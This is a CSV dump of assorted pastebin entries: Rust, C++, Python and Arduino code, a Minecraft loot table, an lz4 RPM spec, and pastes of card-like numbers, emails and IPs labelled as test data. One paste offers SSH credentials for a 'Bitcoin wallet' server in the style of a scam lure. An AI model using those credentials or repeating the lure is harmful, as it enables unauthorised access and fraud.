id,title,username,language,date,content
7AD7uUYp,Kirchhoff BigDecimal for bka,BamgoeSN,Rust,Monday 3rd of July 2023 06:59:23 AM CDT,"#![no_main]

use std::str::FromStr;
#[allow(unused)]
use std::{cmp::*, collections::*, fmt::*, io::*, iter, mem::*, num::*, ops::*};

use bigdecimal::BigDecimal;

fn solve<'t, It: Iterator<Item = &'t str>>(sc: &mut fastio::Tokenizer<It>) {
    let [n, m]: [usize; 2] = sc.next();
    let edges: Vec<(usize, usize, u64)> = (0..m)
        .map(|_| {
            let [u, v] = sc.next_map(|x: usize| x - 1);
            let w: u64 = sc.next();
            (u, v, w)
        })
        .collect();

    let eps = BigDecimal::from_str(""1e-20"")
        .unwrap()
        .with_prec(solver::PREC);
    let ans = solver::conj_grad(n, &edges, &eps);
    println!(""{}"", 1. / ans);
}

#[allow(unused)]
mod solver {
    pub const PREC: u64 = 100;
    use std::assert_eq;

    use bigdecimal::BigDecimal;
    use itertools::Itertools;

    pub fn conj_grad(n: usize, edges: &[(usize, usize, u64)], eps: &BigDecimal) -> BigDecimal {
        let conv_edges: Vec<(usize, usize, BigDecimal)> = edges
            .iter()
            .map(|&(u, v, w)| (u, v, BigDecimal::from(w).with_prec(PREC)))
            .collect();
        let (n, edges) = proc_input(n, &conv_edges);
        let dv = process(n, edges.as_slice(), eps);
        dv
    }

    fn proc_input(
        n: usize,
        edges: &[(usize, usize, BigDecimal)],
    ) -> (usize, Vec<(usize, usize, BigDecimal)>) {
        let mut uf = UnionFind::new(n);
        for &(u, v, _) in edges.iter() {
            uf.union(u, v);
        }
        let withzero: Vec<usize> = (0..n)
            .filter(|&i| uf.find_root(0) == uf.find_root(i))
            .collect();
        let zerotable: Vec<Option<usize>> = {
            let mut table = vec![None; n];
            for (i, &v) in withzero.iter().enumerate() {
                table[v] = Some(i);
            }
            table
        };
        let usededges: Vec<(usize, usize, BigDecimal)> = edges
            .iter()
            .filter_map(|e| {
                if let (Some(i), Some(j)) = (zerotable[e.0], zerotable[e.1]) {
                    Some((i, j, e.2.clone()))
                } else {
                    None
                }
            })
            .collect();
        let n = withzero.len();

        (n, usededges)
    }

    fn process(n: usize, edges: &[(usize, usize, BigDecimal)], eps: &BigDecimal) -> BigDecimal {
        let diag: Vec<BigDecimal> = {
            let mut ret = vec![BigDecimal::from(0).with_prec(PREC); n];
            for e in edges.iter() {
                ret[e.0] -= &e.2;
                ret[e.1] -= &e.2;
            }
            ret
        };

        let b: Vec<BigDecimal> = {
            let mut b = vec![BigDecimal::from(0).with_prec(PREC); n];
            (b[0], b[n - 1]) = (
                BigDecimal::from(1).with_prec(PREC),
                BigDecimal::from(-1).with_prec(PREC),
            );
            b
        };

        let get_ap = |p: &[BigDecimal]| {
            let mut ret = vec![BigDecimal::from(0).with_prec(PREC); n];
            for (i, x) in diag.iter().enumerate() {
                ret[i] += x * &p[i];
            }
            for e in edges.iter() {
                ret[e.0] += &e.2 * &p[e.1];
                ret[e.1] += &e.2 * &p[e.0];
            }
            let pavg: BigDecimal = p.iter().sum::<BigDecimal>() / BigDecimal::from(n as i64);
            for x in ret.iter_mut() {
                *x += &pavg
            }
            ret
        };

        let mut x = vec![BigDecimal::from(0).with_prec(PREC); n];
        let mut r = b;
        let mut p = r.clone();
        let mut rq: BigDecimal = r.iter().map(|r| r * r).sum();
        loop {
            x.iter_mut().for_each(|ele| *ele = ele.with_prec(PREC));
            r.iter_mut().for_each(|ele| *ele = ele.with_prec(PREC));
            p.iter_mut().for_each(|ele| *ele = ele.with_prec(PREC));
            if &rq.abs() <= eps {
                break;
            }
            let ap = get_ap(&p);
            let pap: BigDecimal = p.iter().zip(ap.iter()).map(|(p, sv)| p * sv).sum();
            let alpha = r.iter().map(|x| x * x).sum::<BigDecimal>() / pap;
            x.iter_mut()
                .zip(p.iter())
                .for_each(|(x, p)| *x += &alpha * p);
            let s: Vec<BigDecimal> = r
                .iter()
                .zip(ap.iter())
                .map(|(r, sv)| r - &alpha * sv)
                .collect();
            let sq: BigDecimal = s.iter().map(|s| s * s).sum();
            let c = &sq / rq;
            p = s.iter().zip(p.iter()).map(|(s, p)| s + &c * p).collect();
            r = s;
            rq = sq;
        }

        &x[n - 1] - &x[0]
    }

    struct UnionFind {
        size: usize,
        parents: Vec<usize>,
        group_size: Vec<usize>,
        group_num: usize,
    }

    impl UnionFind {
        /// Returns a new UnionFind instance where `size` number of elements are in their own disjoint set.
        fn new(size: usize) -> Self {
            Self {
                size,
                parents: vec![size; size],
                group_size: vec![1; size],
                group_num: size,
            }
        }

        fn find_root(&mut self, x: usize) -> usize {
            if self.parents[x] == self.size {
                return x;
            }
            let root = self.find_root(self.parents[x]);
            self.parents[x] = root;
            root
        }

        /// Add an edge between a and b.
        fn union(&mut self, a: usize, b: usize) {
            let a_root = self.find_root(a);
            let b_root = self.find_root(b);

            if a_root != b_root {
                self.group_num -= 1;
                let a_size = self.group_size[a_root];
                let b_size = self.group_size[b_root];
                if a_size < b_size {
                    self.parents[a_root] = b_root;
                    self.group_size[b_root] += a_size;
                } else {
                    self.parents[b_root] = a_root;
                    self.group_size[a_root] += b_size;
                }
            }
        }
    }
}

#[allow(unused)]
mod fastio {
    use super::ioutil::*;

    pub struct Tokenizer<It> {
        it: It,
    }

    impl<'i, 's: 'i, It> Tokenizer<It> {
        pub fn new(text: &'s str, split: impl FnOnce(&'i str) -> It) -> Self {
            Self { it: split(text) }
        }
    }

    impl<'t, It: Iterator<Item = &'t str>> Tokenizer<It> {
        pub fn next_ok<T: IterParse<'t>>(&mut self) -> PRes<'t, T> {
            T::parse_from_iter(&mut self.it)
        }

        pub fn next<T: IterParse<'t>>(&mut self) -> T {
            self.next_ok().unwrap()
        }

        pub fn next_map<T: IterParse<'t>, U, const N: usize>(
            &mut self,
            f: impl FnMut(T) -> U,
        ) -> [U; N] {
            let x: [T; N] = self.next();
            x.map(f)
        }

        pub fn next_it<T: IterParse<'t>>(&mut self) -> impl Iterator<Item = T> + '_ {
            std::iter::repeat_with(move || self.next_ok().ok()).map_while(|x| x)
        }
    }
}

mod ioutil {
    use std::{fmt::*, num::*};

    pub enum InputError<'t> {
        InputExhaust,
        ParseError(&'t str),
    }
    use InputError::*;

    pub type PRes<'t, T> = std::result::Result<T, InputError<'t>>;

    impl<'t> Debug for InputError<'t> {
        fn fmt(&self, f: &mut Formatter<'_>) -> Result {
            match self {
                InputExhaust => f.debug_struct(""InputExhaust"").finish(),
                ParseError(s) => f.debug_struct(""ParseError"").field(""str"", s).finish(),
            }
        }
    }

    pub trait Atom<'t>: Sized {
        fn parse(text: &'t str) -> PRes<'t, Self>;
    }

    impl<'t> Atom<'t> for &'t str {
        fn parse(text: &'t str) -> PRes<'t, Self> {
            Ok(text)
        }
    }

    impl<'t> Atom<'t> for &'t [u8] {
        fn parse(text: &'t str) -> PRes<'t, Self> {
            Ok(text.as_bytes())
        }
    }

    macro_rules! impl_atom {
        ($($t:ty) *) => { $(impl Atom<'_> for $t { fn parse(text: &str) -> PRes<Self> { text.parse().map_err(|_| ParseError(text)) } })* };
    }
    impl_atom!(u8 u16 u32 u64 u128 usize i8 i16 i32 i64 i128 isize f32 f64 bool char String NonZeroI8 NonZeroI16 NonZeroI32 NonZeroI64 NonZeroI128 NonZeroIsize NonZeroU8 NonZeroU16 NonZeroU32 NonZeroU64 NonZeroU128 NonZeroUsize);

    pub trait IterParse<'t>: Sized {
        fn parse_from_iter<'s, It: Iterator<Item = &'t str>>(it: &'s mut It) -> PRes<'t, Self>
        where
            't: 's;
    }

    impl<'t, A: Atom<'t>> IterParse<'t> for A {
        fn parse_from_iter<'s, It: Iterator<Item = &'t str>>(it: &'s mut It) -> PRes<'t, Self>
        where
            't: 's,
        {
            it.next().map_or(Err(InputExhaust), <Self as Atom>::parse)
        }
    }

    impl<'t, A: IterParse<'t>, const N: usize> IterParse<'t> for [A; N] {
        fn parse_from_iter<'s, It: Iterator<Item = &'t str>>(it: &'s mut It) -> PRes<'t, Self>
        where
            't: 's,
        {
            use std::mem::*;
            let mut x: [MaybeUninit<A>; N] = unsafe { MaybeUninit::uninit().assume_init() };
            for p in x.iter_mut() {
                *p = MaybeUninit::new(A::parse_from_iter(it)?);
            }
            Ok(unsafe { transmute_copy(&x) })
        }
    }

    macro_rules! impl_tuple {
        ($u:ident) => {};
        ($u:ident $($t:ident)+) => { impl<'t, $u: IterParse<'t>, $($t: IterParse<'t>),+> IterParse<'t> for ($u, $($t),+) { fn parse_from_iter<'s, It: Iterator<Item = &'t str>>(_it: &'s mut It) -> PRes<'t, Self> where 't: 's { Ok(($u::parse_from_iter(_it)?, $($t::parse_from_iter(_it)?),+)) } } impl_tuple!($($t) +); };
    }

    impl_tuple!(Q W E R T Y U I O P A S D F G H J K L Z X C V B N M);
}

fn get_input() -> &'static str {
    let mut buf = String::new();
    stdin().read_to_string(&mut buf).unwrap();
    Box::leak(buf.into_boxed_str())
}

#[no_mangle]
unsafe fn main() -> i32 {
    use std::io::*;
    let mut sc = fastio::Tokenizer::new(get_input(), |s| s.split_ascii_whitespace());
    let stdout = stdout();
    WRITER = Some(BufWriter::new(stdout.lock()));
    solve(&mut sc);
    WRITER.as_mut().unwrap_unchecked().flush().ok();
    0
}

static mut WRITER: Option<BufWriter<StdoutLock>> = None;
#[macro_export]
macro_rules! print {
    ($($t:tt)*) => {{ use std::io::*; write!(unsafe{ WRITER.as_mut().unwrap_unchecked() }, $($t)*).unwrap(); }};
}
#[macro_export]
macro_rules! println {
    ($($t:tt)*) => {{ use std::io::*; writeln!(unsafe{ WRITER.as_mut().unwrap_unchecked() }, $($t)*).unwrap(); }};
}

"
tLiqkxke,Word Ladder 2,Singasking,C++,Monday 3rd of July 2023 06:53:25 AM CDT,"class Solution {
public:
    vector<vector<string>> findLadders(string beginWord, string endWord, vector<string>& wordList) {
           unordered_map<string,int> map;
        for(auto x:wordList) map[x]=0;

        queue<vector<string>> q;
        vector<vector<string>> ans;
        
        q.push({beginWord});
        map[beginWord]=1;
        //1 means visited
        while(!q.empty()) {
            auto temp  = q.front();
            q.pop();
            string word = temp.back();
            
            if(word==endWord) {
                map[word]=0;
                ans.push_back(temp);
          
                continue;
            }
            for(int i=0;i<word.length();i++) {
                char x = word[i];
                for(int c='a';c<='z';c++) {
                 
                   word[i]=c;
                 
                    if (map.find(word)!=map.end() && map.find(word)->second!=1) {
                        map[word]=1;
                        vector<string> list = temp;
                        list.push_back(word);
                        q.push({list});
                    }

                }
                word[i]=x;
            }

            map[word]=0;
        }
        return ans;
    }
};"
7jPJPLVF,my_file,medical-boy-sf,JSON,Monday 3rd of July 2023 06:22:32 AM CDT,"{
  ""type"": ""minecraft:chest"",
  ""pools"": [
    {
      ""rolls"": {
        ""min"": 0,
        ""max"": 2
      },
      ""entries"": [
        {
          ""type"": ""item"",
          ""name"": ""emerald"",
          ""weight"": 4,
          ""functions"": [
            {
              ""function"": ""set_count"",
              ""count"": {
                ""min"": 1,
                ""max"": 3
              }
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""diamond"",
          ""weight"": 2,
          ""functions"": [
            {
              ""function"": ""set_count"",
              ""count"": {
                ""min"": 1,
                ""max"": 2
              }
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""book"",
          ""weight"": 4,
          ""functions"": [
            {
              ""function"": ""enchant_randomly""
            },
            {
              ""function"": ""set_count"",
              ""count"": 1
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""iron_chestplate"",
          ""weight"": 2,
          ""functions"": [
            {
              ""function"": ""enchant_randomly""
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""golden_apple"",
          ""weight"": 3,
          ""functions"": [
            {
              ""function"": ""set_count"",
              ""count"": 1
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""guardian_spawn_egg"",
          ""weight"": 2,
          ""functions"": [
            {
              ""function"": ""set_count"",
              ""count"": 1
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""iron_leggings"",
          ""weight"": 2,
          ""functions"": [
            {
              ""function"": ""enchant_randomly""
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""iron_helmet"",
          ""weight"": 2,
          ""functions"": [
            {
              ""function"": ""enchant_randomly""
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""iron_boots"",
          ""weight"": 2,
          ""functions"": [
            {
              ""function"": ""enchant_randomly""
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""iron_sword"",
          ""weight"": 2,
          ""functions"": [
            {
              ""function"": ""enchant_randomly""
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""iron_golem_spawn_egg"",
          ""weight"": 2,
          ""functions"": [
            {
              ""function"": ""enchant_randomly""
            }
          ]
        }
      ]
    },
    {
      ""rolls"": {
        ""min"": 5,
        ""max"": 8
      },
      ""entries"": [
        {
          ""type"": ""item"",
          ""name"": ""gunpowder"",
          ""weight"": 5,
          ""functions"": [
            {
              ""function"": ""set_count"",
              ""count"": {
                ""min"": 2,
                ""max"": 5
              }
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""pumpkin_pie"",
          ""weight"": 10,
          ""functions"": [
            {
              ""function"": ""set_count"",
              ""count"": {
                ""min"": 1,
                ""max"": 3
              }
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""bone_block"",
          ""weight"": 7,
          ""functions"": [
            {
              ""function"": ""set_count"",
              ""count"": {
                ""min"": 1,
                ""max"": 3
              }
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""wheat_seeds"",
          ""weight"": 5,
          ""functions"": [
            {
              ""function"": ""set_count"",
              ""count"": {
                ""min"": 2,
                ""max"": 5
              }
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""pumpkin_seeds"",
          ""weight"": 5,
          ""functions"": [
            {
              ""function"": ""set_count"",
              ""count"": {
                ""min"": 2,
                ""max"": 5
              }
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""melon_seeds"",
          ""weight"": 5,
          ""functions"": [
            {
              ""function"": ""set_count"",
              ""count"": {
                ""min"": 2,
                ""max"": 5
              }
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""rotten_flesh"",
          ""weight"": 10,
          ""functions"": [
            {
              ""function"": ""set_count"",
              ""count"": {
                ""min"": 1,
                ""max"": 7
              }
            }
          ]
        }
      ]
    }
  ]
}"
65CcbAHA,A*,KirillSamokhin,Python,Monday 3rd of July 2023 06:14:59 AM CDT,"class Heap:
    def __init__(self, arr=None):
        ""Инициализация объекта класса""
        if arr is None:
            arr = []
        self.__heap = []
        for el in arr:
            self.put(el)

    def sift_up(self, index):
        ""Просеивает узел с индексом index вверх""
        if index < 0 or index >= len(self.__heap):
            return
        parent = (index - 1) // 2
        while index and not self.__heap[parent] < self.__heap[index]:
            self.__heap[parent], self.__heap[index] = self.__heap[index], self.__heap[parent]
            index, parent = parent, (index - 1) // 2

    def sift_down(self, index):
        ""Просеивает узел с индексом index вниз""
        if index < 0 or index >= len(self.__heap):
            return
        minIndex = index
        while True:
            left, right = 2*index + 1, 2*index + 2
            if right < len(self.__heap) and self.__heap[right] < self.__heap[minIndex]:
                minIndex = right
            if left < len(self.__heap) and self.__heap[left] < self.__heap[minIndex]:
                minIndex = left
            if minIndex == index:
                return
            else:
                self.__heap[index], self.__heap[minIndex] = self.__heap[minIndex], self.__heap[index]
                index = minIndex

    def extract_min(self):
        ""Метод достаёт минимальный элемент из кучи, меняет его местами с максимальным и потом удаляет""
        if not self.__heap:
            return
        min_element = self.__heap[0]
        self.__heap[0] = self.__heap[-1]
        del self.__heap[-1]
        self.sift_down(0)
        return min_element

    def put(self, element):
        ""метод добавляет в конец кучи новый элемент, после чего просеивает его вверх""
        self.__heap.append(element)
        self.sift_up(self.size() - 1)

    def size(self):
        ""Метод возвращает размер кучи""
        return len(self.__heap)
    
class Graph:
    def __init__(self, dictionary):
        self.graph = dictionary

    def heuristic(self, cur_vert, end_vert):
        return abs(ord(end_vert) - ord(cur_vert))

    def a_star(self, start, end):
        distances = dict({start: 0})
        roots = dict({start: None})
        queue = Heap([(0, start)])
        while queue.size() != 0:
            cur = queue.extract_min()[1]
            if cur == end:
                break
            if not self.graph[cur].keys():
                continue
            for node, val in self.graph[cur].items():
                temp_dist = distances[cur] + val
                if node not in distances or temp_dist < distances[node]:
                    roots[node] = cur
                    distances[node] = temp_dist
                    queue.put((temp_dist + self.heuristic(node, end), node))
        return roots

    def recover_path(self, map, end):
        path = ''
        current = end
        while current:  # пока существует вершина из которой пришли
            path += current  # к пути добавляем текущую
            current = map[current]  # берем вершину откуда пришли в текущую
        return path[::-1]  # переворачиваем путь


begin, destination = input().split(' ')
config = {}
while True:
    try:
        line = input()
    except EOFError:
        break
    if not line:
        break
    vert, dest, length = line.split(' ')
    length = float(length)
    if vert not in config.keys():
        config[vert] = {}
    config[vert][dest] = length
    config[vert] = dict(sorted(config[vert].items()))
    if dest not in config.keys():
        config[dest] = {}
ex = Graph(config)
lst = ex.a_star(begin, destination)
result = ex.recover_path(lst, destination)
print(result)"
21n4C6LA,BTC Wallet Credentials have been reset,placeheart_58,GetText,Monday 3rd of July 2023 06:10:06 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials are cecilokurah8:fpExXR on 45.9.148.244
You can connect via SSH.
Regards"
CvdkVgXm,data622,TestGuy1,JSON,Monday 3rd of July 2023 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '35bc0653a51b87f26fba7f3b5932f63bd03b3b71a047989a508eec1eea8b59ee29417fa3001bef4df5a7c53af1da041aff871e4f869843ed43cfd6da2358e579220671ad3ed06e7c8e8df3df10f3893dff34386af7ae7e8d1d30bf6543cff595a645e0ded125a30fc041ed020be757d7f3e3b87cfe729f5116936a8e111997ab',
  otherdata: [
    '423e47670c6c0588dd312491f9f5fa2a',
    '061ee7e9ba50ee254f18c3f2068912c4',
    '2f6aa2a550fe3c347d76ce3d3872df7f',
    '3f2d70c0a8b7d269b32f53ee8b2fc0b3',
    'b931fbd5eb4d4f8cc32e856133ddb75a',
    '6c6a405f9622af9f1637e3ad35efcde1',
    'd6ee8d98cbe4904a1a02c84221304445',
    '267644af1eef1e85b654dd9d896de47b'
  ]
}"
we2UDgFe,Untitled,vladislav_larionov,RPM Spec,Monday 3rd of July 2023 05:57:14 AM CDT,"Summary: Extremely Fast Compression algorithm
Name: ru.auroraos.lz4
Version: 1.8.1.3
Release: 1%{?dist}
License: BSD-type license
Group: Libraries/Databases
URL: https://github.com/lz4/lz4

Source: %{name}-%{version}.tar.gz
BuildRoot: %{_tmppath}/%{name}-%{version}-%{release}-root

BuildRequires: gcc-c++
#Requires: pango

%description
LZ4 is lossless compression algorithm

PackageName: LZ4
Categories:
  - Library

%package devel
Summary: lz4 development headers and static library
Group: Development/Libraries
Requires: %{name} = %{version}

%description devel
LZ4 is lossless compression algorithm. This
package provides libraries and headers for development

PackageName: LZ4 Development
Categories:
  - Library

%package tools
Summary: lz4 tools
Group: Development/Libraries
Requires: %{name} = %{version}

%description tools
LZ4 is lossless compression algorithm. This
package provides tools

PackageName: LZ4 Tools
Type: console-application
Categories:
  - Utility

%prep
%setup -q -n %{name}-%{version}/lz4


%build
%{__make} clean || true

CFLAGS=""$CFLAGS -fPIC""
CXXFLAGS=""$CXXFLAGS -fPIC""

%{__make} prefix=/usr %{?_smp_mflags}  CC=gcc

%install
%{__rm} -rf %{buildroot}
%{__make} install prefix=%{_prefix} LIBDIR=%{_libdir} DESTDIR=%{buildroot}

desktop-file-install \
  --dir %{buildroot}%{_datadir}/applications \
   %{_sourcedir}/../lz4/ru.auroraos.lz4.desktop


%clean
%{__rm} -rf %{buildroot}

%pre

%post -n ru.auroraos.lz4 -p /sbin/ldconfig

%postun -n ru.auroraos.lz4 -p /sbin/ldconfig

%files

%defattr(644,root,root,0755)
# %exclude %{_defaultdocdir}/snappy
%{_libdir}/liblz4.so.*
%exclude %{_mandir}/man1/*lz4*

%{_datadir}/applications/%{name}.desktop


%files devel
%defattr(-, root, root, 0755)
%{_includedir}/lz4*.h
%{_libdir}/liblz4.a
%{_libdir}/liblz4.so
%{_libdir}/pkgconfig/liblz4.pc
%exclude %{_libdir}/libsnappy.la

%files tools
%defattr(-, root, root, 0755)
%{_bindir}/lz4*
%{_bindir}/unlz4

%changelog
* Thu Mar 29 2018 rinigus <rinigus.git@gmail.com> - 1.8.1.2
- initial packaging release for SFOS"
7heHn47E,Maduino Zero SAMD21G18A CAN-BUS Dev Board,microrobotics,Arduino,Monday 3rd of July 2023 04:35:29 AM CDT,"/*
You should type your messages as IDH,IDH,LEN,D0,D1,D2,D3,D4,D5,D6,D7\n, where:
IDH,IDL are the high and low parts of the CAN ID, in hexadecimal.
LEN is the data length (0 to 8).
D0 to D7 are the data bytes, in hexadecimal.
If you type 123,456,3,12,34,56, this will send a CAN message with ID 0x123456, length 3, and data bytes 0x12, 0x34, 0x56.

This code listens for user input. Once a newline is received, it parses the input and sends it as a CAN message. Note that this code does not handle errors in the input format, you should ensure you enter the data correctly.
*/

#include <mcp_can.h>
#include <SPI.h>

MCP_CAN CAN(10); // Set CS to pin 10
String inputString = """";

void setup() {
    Serial.begin(115200);

    while (CAN_OK != CAN.begin(CAN_500KBPS)) {            // init can bus : baudrate = 500k
        Serial.println(""CAN BUS Shield init fail"");
        Serial.println("" Init CAN BUS Shield again"");
        delay(100);
    }
    Serial.println(""CAN BUS Shield init ok!"");
}

void loop() {
    unsigned char len = 0;
    unsigned char buf[8];

    if (CAN_MSGAVAIL == CAN.checkReceive()) {            // check if data coming
        CAN.readMsgBuf(&len, buf);    // read data,  len: data length, buf: data buf

        unsigned long canId = CAN.getCanId();

        Serial.println(""-----------------------------"");
        Serial.println(""Get data from CAN BUS"");
        Serial.print(""CAN ID: "");
        Serial.println(canId, HEX); // Prints ID in HEX format

        Serial.print(""CAN Data: "");
        for(int i = 0; i<len; i++) {    // print the data
            Serial.print(buf[i], HEX); // Prints data bytes in HEX format
            Serial.print(""\t"");
        }
        Serial.println();
    }

    // check if there's any serial available
    while (Serial.available()) {
        char inChar = (char)Serial.read();
        inputString += inChar;

        // if received character is a newline, parse the command
        if (inChar == '\n') {
            parseCommand(inputString);
            inputString = """";
        }
    }
}

void parseCommand(String command) {
    // parse the command in the format: IDH,IDH,LEN,D0,D1,D2,D3,D4,D5,D6,D7
    int parts[11];
    int i = 0;

    int idx1 = 0;
    int idx2 = command.indexOf(',');
    while (idx2 != -1 && i < 11) {
        parts[i++] = strtol(command.substring(idx1, idx2).c_str(), NULL, 16);
        idx1 = idx2 + 1;
        idx2 = command.indexOf(',', idx1);
    }
    if (i < 11) {
        parts[i++] = strtol(command.substring(idx1).c_str(), NULL, 16);
    }

    // sanity check
    if (parts[2] > 8 || parts[2] < 0) {
        Serial.println(""Invalid length"");
        return;
    }

    // prepare id and data
    unsigned long canId = (parts[0] << 8) + parts[1];
    unsigned char len = parts[2];
    unsigned char data[8];
    for (int i = 0; i < len; i++) {
        data[i] = parts[3 + i];
    }

    // send the message
    CAN.sendMsgBuf(canId, 0, len, data);
    Serial.println(""Sent CAN message"");
}
"
WdxvsB9g,Advanced AND - Donald AND Duck AND Hello,wheresTheAnyKey,C,Monday 3rd of July 2023 04:15:56 AM CDT,"Pasted at: 03/07/2023 10:15
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND
hello, donald was a duck

5502491997132108

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
wmke109u,Financial What's Inside - Email/IP/Bank,wheresTheAnyKey,C,Monday 3rd of July 2023 04:15:55 AM CDT,"Pasted at: 03/07/2023 10:15
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3
What's Inside Paste 

5378496492418234
5571598708435236
5587663820997281
5502491997132108
5516931903918995
5322909948799236
5443317136071703
5409137465238695
5497550044220575
5559606180091553

aaribaud@att.net
aaribaud@comcast.net
aaribaud@att.com
aaribaud@att.co.uk
aaribaud@yahoo.com

246.107.72.199
221.187.199.189
3.109.3.44
109.112.85.139
250.83.213.179
169.141.201.234
50.180.50.59
20.181.54.231
64.235.191.167
48.103.36.43"
